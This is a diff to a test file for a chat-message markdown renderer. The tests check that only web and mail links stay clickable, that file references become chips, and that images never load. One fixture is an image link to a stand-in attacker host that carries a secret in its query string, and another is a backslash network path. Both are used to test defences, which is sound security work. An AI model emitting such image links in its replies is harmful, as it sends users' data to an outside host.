@@ -51,25 +51,27 @@ describe('message markdown', () => {
     expect(html).toContain('bad')
   })
 
-  it('keeps Markdown-escaped backslashes as local path characters, never a network path', () => {
+  it('keeps Markdown-escaped backslashes as path characters in a chip, never a network path or a link', () => {
     const html = render('[local](\\\\example.com/path)')
-    const href = /href="([^"]+)"/.exec(html)?.[1]
-    expect(href).toBeDefined()
-    expect(new URL(href!, 'https://host.test/link/').origin).toBe('https://host.test')
+    expect(html).not.toContain('href=')
+    expect(html).toContain('data-file-chip=""')
   })
 
-  it('allows web, mail and relative links, isolating external navigation', () => {
+  it('links only web and mail addresses, isolating external navigation; file references become chips', () => {
     const html = render(
       '[web](https://example.com/a?q=1) [mail](mailto:team@example.com) [local](/link/help) [relative](./report.md) [anchor](#result)',
     )
     expect(html).toContain('href="https://example.com/a?q=1" target="_blank" rel="noopener noreferrer"')
     expect(html).toContain('<a href="mailto:team@example.com">mail</a>')
-    expect(html).toContain('<a href="/link/help">local</a>')
-    expect(html).toContain('<a href="./report.md">relative</a>')
-    expect(html).toContain('<a href="#result">anchor</a>')
+    expect(html.match(/href=/g)).toHaveLength(2)
+    expect(html.match(/data-file-chip=""/g)).toHaveLength(2)
+    expect(html).toContain('aria-label="/link/help"')
+    expect(html).toContain('aria-label="./report.md"')
+    // A fragment the model wrote is not a footnote of this reply: it stays text.
+    expect(html).toContain('<span>anchor</span>')
   })
 
-  it('never loads images: a web image becomes a link the reader opens, others only their alt text', () => {
+  it('never loads images: a web image becomes a link the reader opens, a file a chip, others only their alt text', () => {
     const html = render(
       '![diagram](https://attacker.example/p?d=secret) ![local](/link/api/snapshot) ![unsafe](data:image/svg+xml;base64,PHN2Zz4=) ![](mailto:team@example.com)',
     )
@@ -77,7 +79,8 @@ describe('message markdown', () => {
     expect(html).toContain(
       '<a class="message-image" href="https://attacker.example/p?d=secret" target="_blank" rel="noopener noreferrer">外部图片：diagram</a>',
     )
-    expect(html).toContain('<span class="message-image">图片：local</span>')
+    expect(html).toContain('aria-label="图片「local」：/link/api/snapshot"')
+    expect(html).toContain('<span class="file-chip-prefix">图片</span>')
     expect(html).toContain('<span class="message-image">图片：unsafe</span>')
     expect(html).toContain('<span class="message-image">图片：图片</span>')
     expect(html).not.toContain('data:image')
